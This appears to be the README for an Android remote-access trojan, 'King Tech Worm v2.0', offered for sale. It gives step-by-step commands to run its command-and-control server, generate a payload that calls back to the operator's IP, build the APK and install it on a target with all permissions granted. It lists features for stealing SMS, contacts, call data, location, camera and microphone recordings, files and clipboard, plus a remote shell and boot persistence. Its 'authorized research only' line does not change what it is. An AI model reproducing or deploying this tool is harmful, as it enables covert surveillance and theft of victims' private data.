King Tech Worm v2.0 - Advanced Encrypted Android RAT
====================================================

For authorized security research only.

Structure:
- c2/king_tech_worm_v2.py
- payload_generator/generate_android_worm_v2.py
- docs/

Quick Start:
1. On Kali:
   pip install pycryptodome colorama
   sudo python3 c2/king_tech_worm_v2.py

2. Generate payload:
   python3 payload_generator/generate_android_worm_v2.py YOUR_PUBLIC_OR_LOCAL_IP 4444

3. Open the generated "KingTech_Worm_Payload_v2" folder in Android Studio
4. Build APK (Build → Build Bundle(s) / APK(s) → Build APK(s))
5. Install on target and grant all permissions when asked.

Main Features:
- AES-256 encrypted communication
- SMS + Contacts + Call related steal
- GPS location
- Camera (front & back)
- Microphone recording
- File listing & download
- Remote shell
- Installed apps list
- Clipboard
- Auto-reconnect + Boot persistence + Foreground service
- Network scanner from C2
- Broadcast commands

Price recommendation for this level: significantly higher than v1 because of encryption + real stealers + better architecture.
"""
